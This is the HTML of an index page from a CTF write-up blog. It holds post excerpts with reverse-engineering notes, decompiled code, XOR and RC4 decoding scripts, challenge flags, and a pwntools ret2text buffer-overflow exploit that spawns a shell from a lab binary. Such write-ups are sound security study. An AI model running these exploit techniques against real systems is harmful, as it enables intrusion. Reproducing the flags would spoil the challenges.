    <span class="token number">39</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">70</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">118</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">123</span><span class="token punctuation">,</span>
    <span class="token number">113</span><span class="token punctuation">,</span>
    <span class="token number">69</span><span class="token punctuation">,</span>
    <span class="token number">79</span><span class="token punctuation">,</span>
    <span class="token number">82</span><span class="token punctuation">,</span>
    <span class="token number">84</span><span class="token punctuation">,</span>
    <span class="token number">89</span><span class="token punctuation">,</span>
    <span class="token number">84</span><span class="token punctuation">,</span>
    <span class="token number">77</span><span class="token punctuation">,</span>
    <span class="token number">76</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">99</span><span class="token punctuation">,</span>
    <span class="token number">112</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">65</span><span class="token punctuation">,</span>
    <span class="token number">39</span><span class="token punctuation">,</span>
    <span class="token number">116</span><span class="token punctuation">,</span>
    <span class="token number">97</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">102</span><span class="token punctuation">,</span>
    <span class="token number">86</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">37</span><span class="token punctuation">,</span>
    <span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">104</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>smc 顾名思义Self-Modifying Code，将代码加密，在运行的时候运行解密的函数，解密加密的代码</p>
<p>这里首先用了一个 VP函数改变了text段的权限，然后通过sub_401042() 里的逻辑，对加密的代码解密，只需要用idapy写一个解密的逻辑，然后转unk类型 转function类型，就能看到加密前的逻辑了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  DWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>

  v3 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x26u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_403040<span class="token punctuation">,</span> <span class="token number">0x26u</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_401025</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4033D4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">NtCurrentPeb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>BeingDebugged <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Debug Detected!"</span><span class="token punctuation">,</span> <span class="token string">"Warning!"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">0x1388u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sub_401042</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>byte_403040<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4033D4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_403020<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Lose!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2023/11/05/newstar-week2/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/10/21/0xgame/" >0xgame</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-10-21  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><p>Re</p>
<h2 id="数字筑基"><a href="#数字筑基" class="headerlink" title="数字筑基"></a>数字筑基</h2><p>​	</p>
<pre class="line-numbers language-none"><code class="language-none">else
  &#123;
    sub_401020((char *)&amp;byte_402210, Arglist[0]);
    v4 &#x3D; &quot;0xGame&#123;5f4812eb-6dee-46ab-9910-92af643cd911&#125;\n&quot;;
  &#125;
  sub_401020(v4, Arglist[0]);
  system(&quot;pause&quot;);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">0xGame&#123;5f4812eb-6dee-46ab-9910-92af643cd911&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="代码金丹"><a href="#代码金丹" class="headerlink" title="代码金丹"></a>代码金丹</h2><pre class="line-numbers language-none"><code class="language-none">v3 &#x3D; strcmp(Arglist, &quot;0xGame&#123;620bbfcb-e56f-4e6d-8069-9587e066130a&#125;&quot;);
if ( v3 )
  v3 &#x3D; v3 &lt; 0 ? -1 : 1;
v4 &#x3D; (char *)&amp;unk_4021B0;
if ( !v3 )
  v4 &#x3D; (char *)&amp;byte_40217C;
sub_401020(v4, Arglist[0]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">0xGame&#123;620bbfcb-e56f-4e6d-8069-9587e066130a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="网络元婴"><a href="#网络元婴" class="headerlink" title="网络元婴"></a>网络元婴</h2>
	
	</div>
  <a type="button" href="/2023/10/21/0xgame/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/09/26/exp本地不通远程通的问题/" >exp本地不通远程通的问题</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-09-26  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>今天看一个ret2text的题目的时候，遇到了exp本地不通，远程通的奇怪问题，题目是这样的</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663341172.png" class title="uTools_1695663341172">

<p>有个backdoor函数是这样的</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663362912.png" class title="uTools_1695663362912">

<p>exp是这样的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># p=remote("1.container.jingsai.apicon.cn",30509)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Intruduce'</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
backd00r<span class="token operator">=</span><span class="token number">0x4011B6</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>backd00r<span class="token punctuation">)</span>
s<span class="token operator">=</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
char<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>gdb调试了一下发现在call system的时候卡在了这个xmm寄存器里</p>
<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663133026.png" class title="uTools_1695663133026">

<p>搜索了一下，在这里找到了解决方法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/107695261">https://blog.csdn.net/fjh1997/article/details/107695261</a></p>
<p>发现是glibc &gt;&#x3D; 2.27的时候 system函数里面会调用xmm寄存器，xmm寄存器要求16字节对齐，远程的环境应该是&lt;2.27的所以可以直接打通，然后我本地的glibc版本是2.35的，所以会因为xmm寄存器内存对齐的原因导致exp打不通，只需要少push一个地址，内存就对齐了</p>
	
	</div>
  <a type="button" href="/2023/09/26/exp本地不通远程通的问题/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/09/18/sictf2023r2/" >sictf2023</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-09-18  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h3 id="附件-https-github-com-nyyyddddn-ctf-tree-main-Sictf2023-20-23Round-202"><a href="#附件-https-github-com-nyyyddddn-ctf-tree-main-Sictf2023-20-23Round-202" class="headerlink" title="附件 https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202"></a>附件 <a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202">https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202</a></h3><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="签到-PYC"><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h2><p>电脑上的pycdc出问题了，就找个在线的</p>
<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/string/pyc-compile-decompile">https://www.lddgo.net/string/pyc-compile-decompile</a></p>
<p>print(‘SICTF{07e278e7-9d66-4d90-88fc-8bd61e490616}’)</p>
<h2 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h2><p>rc4加解密，写个脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rc4</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    S <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token comment"># Swap values</span>
    i <span class="token operator">=</span> <span class="token number">0</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> byte <span class="token keyword">in</span> plaintext<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  
        K <span class="token operator">=</span> S<span class="token punctuation">[</span><span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span>
        output<span class="token punctuation">.</span>append<span class="token punctuation">(</span>byte <span class="token operator">^</span> K<span class="token punctuation">)</span>

    <span class="token keyword">return</span> output
key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token string">"SIFLAG"</span><span class="token punctuation">]</span>
v18_bytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x47CF225A0ED32730</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
ciphertext_v19 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>
v20_bytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x9F88FE10771C0107</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>

full_ciphertext_27 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>v18_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> ciphertext_v19 <span class="token operator">+</span> <span class="token builtin">list</span><span class="token punctuation">(</span>v20_bytes<span class="token punctuation">)</span>

decrypted_full_combined <span class="token operator">=</span> rc4<span class="token punctuation">(</span>key<span class="token punctuation">,</span> full_ciphertext_27<span class="token punctuation">)</span>
decrypted_full_combined_string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> decrypted_full_combined<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>decrypted_full_combined_string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SICTF{wow_you_get_the_flag}</p>
	
	</div>
  <a type="button" href="/2023/09/18/sictf2023r2/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/09/18/cnss2023/" >cnss2023</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-09-18  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-SignIn"><a href="#Baby-SignIn" class="headerlink" title="[Baby] SignIn"></a>[Baby] SignIn</h2><p>查看源代码，script.js文件中有一段document.getElementById(‘flag’).addEventListener(‘click’, function()下面是一段jsfuck混淆</p>
<p><a target="_blank" rel="noopener" href="https://enkhee-osiris.github.io/Decoder-JSFuck/">https://enkhee-osiris.github.io/Decoder-JSFuck/</a>  得到flag</p>
<h2 id="Baby-Backdoor"><a href="#Baby-Backdoor" class="headerlink" title="[Baby] Backdoor"></a>[Baby] Backdoor</h2><p>post传system()执行系统命令，找到flag</p>
<h2 id="Baby-Webpack"><a href="#Baby-Webpack" class="headerlink" title="[Baby] Webpack"></a>[Baby] Webpack</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/guowenrui/p/17023732.html">https://www.cnblogs.com/guowenrui/p/17023732.html</a> 参考的这个文章</p>
<p>安装nodejs 用reverse-sourcemap .map文件还原找到flag</p>
<h2 id="Easy-Leak"><a href="#Easy-Leak" class="headerlink" title="[Easy] Leak"></a>[Easy] Leak</h2>
	
	</div>
  <a type="button" href="/2023/09/18/cnss2023/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2023/09/18/hello-world/" >Hello World</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-09-18  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2023/09/18/hello-world/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/5/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/ctf/">ctf<span>57</span></a></li>
		
			<li><a href="/categories/gdb/">gdb<span>1</span></a></li>
		
			<li><a href="/categories/misc/">misc<span>1</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
		
			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
		
			<li><a href="/tags/heap/">heap<span>13</span></a></li>
		
			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
		
			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
		
			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
		
			<li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
		
			<li><a href="/tags/shellcode/">shellcode<span>5</span></a></li>
		
			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
		
			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
		
			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
		
			<li><a href="/tags/misc/">misc<span>1</span></a></li>
		
			<li><a href="/tags/iot/">iot<span>1</span></a></li>
		
			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
		
			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
		
			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
		
			<li><a href="/tags/fmt/">fmt<span>7</span></a></li>
		
			<li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
		
			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
		
			<li><a href="/tags/vm-pwn/">vm pwn<span>2</span></a></li>
		
		
		   <li><a href="/tags">...<span>22</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2025/08/25/nssctf4th_pwn/" ><i class="fa fa-file-o"></i>nkctf_wp</a>
      </li>
    
      <li>
        <a href="/2025/06/18/SmileyCTF/" ><i class="fa fa-file-o"></i>SmileyCTF</a>
      </li>
    
      <li>
        <a href="/2025/04/29/hackergame2024复现/" ><i class="fa fa-file-o"></i>hackergame2024复现</a>
      </li>
    
      <li>
        <a href="/2025/04/09/Squ1rrelCTF/" ><i class="fa fa-file-o"></i>Squ1rrelCTF</a>
      </li>
    
      <li>
        <a href="/2025/01/27/x3ctf/" ><i class="fa fa-file-o"></i>x3ctf</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://blog.yuro.work/" title="" target="_blank"]);">yuro</a></li>
	
		<li><i class="false"></i><a href="https://shinichicun.top/" title="" target="_blank"]);">shin</a></li>
	
		<li><i class="false"></i><a href="https://k0rian.github.io/" title="" target="_blank"]);">k0rain</a></li>
	
		<li><i class="false"></i><a href="https://tokameine.top/" title="" target="_blank"]);">TokameinE</a></li>
	
		<li><i class="false"></i><a href="https://blog.xinshi.fun/" title="" target="_blank"]);">LilRan</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
